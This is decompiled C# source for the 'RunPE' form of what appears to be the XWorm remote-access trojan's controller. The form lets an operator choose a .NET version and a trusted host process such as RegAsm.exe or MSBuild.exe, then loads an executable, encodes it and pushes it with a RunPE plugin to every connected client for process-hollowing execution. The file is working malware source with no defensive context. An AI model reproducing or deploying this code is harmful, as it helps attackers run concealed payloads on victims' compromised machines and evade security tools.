using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm;

[DesignerGenerated]
public class RunPE : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R39_002D0
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R39_002D0(_Closure_0024__R39_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R2(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton2")]
	private Guna2GradientButton _Guna2GradientButton2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton3")]
	private Guna2GradientButton _Guna2GradientButton3;

	private string string_0;

	private string string_1;

	public byte[] bytes_0;

	public string string_2;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	[field: AccessedThroughProperty("Label2")]
	public Label Label2
	;

	[field: AccessedThroughProperty("Guna2ComboBox2")]
	public Guna2ComboBox Guna2ComboBox2
	;

	[field: AccessedThroughProperty("Guna2ComboBox1")]
	public Guna2ComboBox Guna2ComboBox1
	;

	public Guna2GradientButton Guna2GradientButton1
;

	public Guna2GradientButton Guna2GradientButton2
	;

	public Guna2GradientButton Guna2GradientButton3
	;
	public RunPE()
	{
		base.Load += RunPE_Load;
		string_0 = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\";
		string_1 = "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.RunPE));
		this.Label1 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
		base.SuspendLayout();
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Guna2GradientButton2.Click += new System.EventHandler(Guna2GradientButton2_Click);
		this.Guna2GradientButton3.Click += new System.EventHandler(Guna2GradientButton3_Click);
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(16, 33);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(37, 13);
		this.Label1.TabIndex = 2;
		this.Label1.Text = ".NET :";
		this.Label2.AutoSize = true;
		this.Label2.ForeColor = System.Drawing.Color.Black;
		this.Label2.Location = new System.Drawing.Point(23, 60);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(30, 13);
		this.Label2.TabIndex = 3;
		this.Label2.Text = "File :";
		this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.BorderRadius = 3;
		this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox2.ItemHeight = 15;
		this.Guna2ComboBox2.Items.AddRange(new object[5] { "aspnet_compiler.exe", "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe", "vbc.exe" });
		this.Guna2ComboBox2.Location = new System.Drawing.Point(59, 57);
		this.Guna2ComboBox2.Name = "Guna2ComboBox2";
		this.Guna2ComboBox2.Size = new System.Drawing.Size(176, 21);
		this.Guna2ComboBox2.TabIndex = 92;
		this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.BorderRadius = 3;
		this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox1.ItemHeight = 15;
		this.Guna2ComboBox1.Items.AddRange(new object[2] { "v4.0", "v2.0" });
		this.Guna2ComboBox1.Location = new System.Drawing.Point(59, 30);
		this.Guna2ComboBox1.Name = "Guna2ComboBox1";
		this.Guna2ComboBox1.Size = new System.Drawing.Size(176, 21);
		this.Guna2ComboBox1.TabIndex = 93;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(59, 84);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(176, 24);
		this.Guna2GradientButton1.TabIndex = 94;
		this.Guna2GradientButton1.Text = "Select";
		this.Guna2GradientButton2.BorderRadius = 4;
		this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton2.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton2.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton2.Location = new System.Drawing.Point(12, 143);
		this.Guna2GradientButton2.Name = "Guna2GradientButton2";
		this.Guna2GradientButton2.Size = new System.Drawing.Size(84, 24);
		this.Guna2GradientButton2.TabIndex = 95;
		this.Guna2GradientButton2.Text = "Ok";
		this.Guna2GradientButton3.BorderRadius = 4;
		this.Guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton3.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton3.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton3.Location = new System.Drawing.Point(163, 143);
		this.Guna2GradientButton3.Name = "Guna2GradientButton3";
		this.Guna2GradientButton3.Size = new System.Drawing.Size(84, 24);
		this.Guna2GradientButton3.TabIndex = 96;
		this.Guna2GradientButton3.Text = "Close";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(259, 179);
		base.Controls.Add(this.Guna2GradientButton3);
		base.Controls.Add(this.Guna2GradientButton2);
		base.Controls.Add(this.Guna2GradientButton1);
		base.Controls.Add(this.Guna2ComboBox1);
		base.Controls.Add(this.Guna2ComboBox2);
		base.Controls.Add(this.Label2);
		base.Controls.Add(this.Label1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "RunPE";
		base.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
		this.Text = "RunPE";
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void RunPE_Load(object sender, EventArgs e)
	{
		Guna2ComboBox1.Text = "v4.0";
		Guna2ComboBox2.Text = "aspnet_compiler.exe";
	}

	private void Guna2GradientButton3_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe)|*.exe";
			openFileDialog2.Title = "Select .Net File";
			openFileDialog2 = null;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly");
					ProjectData.ClearProjectError();
					return;
				}
				bytes_0 = Module0.smethod_9(File.ReadAllBytes(openFileDialog.FileName));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton2_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2ComboBox1.Text, "v4.0", TextCompare: false) == 0)
		{
			string_2 = string_0;
		}
		if (Operators.CompareString(Guna2ComboBox1.Text, "v2.0", TextCompare: false) == 0)
		{
			string_2 = string_1;
		}
		try
		{
			if (bytes_0 == null)
			{
				return;
			}
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\RunPE.dll") + GClass19.string_0 + string_2 + Guna2ComboBox2.Text + GClass19.string_0 + Convert.ToBase64String(bytes_0));
			_Closure_0024__R39_002D0 closure_0024__R39_002D = default(_Closure_0024__R39_002D0);
			foreach (GClass5 item in (IEnumerable)MyProject.Forms.Main.method_0())
			{
				closure_0024__R39_002D = new _Closure_0024__R39_002D0(closure_0024__R39_002D);
				closure_0024__R39_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R39_002D._Lambda_0024__R2, array);
			}
			MessageBox.Show("DONE!");
			Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}
}